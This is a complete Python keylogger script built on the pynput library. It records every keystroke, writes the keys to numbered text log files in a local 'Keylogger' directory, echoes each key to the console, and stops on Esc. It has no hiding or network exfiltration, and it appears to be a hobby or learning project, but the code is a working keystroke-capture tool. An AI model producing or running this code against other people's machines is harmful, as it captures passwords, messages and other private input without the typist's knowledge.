from pynput.keyboard import Key, Listener
import os

base_dir = r"D:\\Programs\\Pracovni_prostredi\\Internet_projects\\Keylogger"
base_filename = "log"
file_extension = ".txt"


def generate_new_filename(base_dir, base_filename, file_extension):
    # Generate new file name function
    os.makedirs(base_dir, exist_ok=True)

    file_number = 0
    
    while True:
    # Makes new file name serial number
        if file_number == 0:
            filename = f"{base_filename}{file_extension}"
        else:
            filename = f"{base_filename}{file_number}{file_extension}"
        
        file_path = os.path.join(base_dir, filename)
        
        # Return file path if the file not exist
        if not os.path.exists(file_path):
            return file_path
        
        # Will increase the number
        file_number += 1

log_file_path = generate_new_filename(base_dir, base_filename, file_extension)

keys = []

def on_press(key):
    # Adds the key object to the keys list.
    keys.append(key)
    write_file(keys)

    try:
        print("alphanumeric key {0} pressed".format(key.char))
    except AttributeError:
        print("special key {0} pressed".format(key))

def write_file(keys):
    # Opening file in mode "a"
    with open(log_file_path, "a") as f:
        for key in keys:
            # removing ""
            k = str(key).replace("'", "")
            
            if k.find("Key") != -1:
                # Makes a space if the space bar is pressed
                if k == "Key.space":
                    f.write(' ')
                # Makes new line if the enter is pressed
                elif k == "Key.enter":
                    f.write('\n')
                # Makes tab if the tabulator is pressed
                elif k == "Key.tab":
                    f.write('\t')
                else:
                    f.write(f'[{k}]')
            else:
                f.write(k)

            f.write(" ") # Add's space after every key

        keys.clear() # Delete list after enrollment
            

def on_release(key):

    print("{0} released".format(key))
    if key == Key.esc:
        # Shut down listener on specific key
        return False

# Turn on listener
with Listener(on_press = on_press,
              on_release = on_release) as listener:
    listener.join()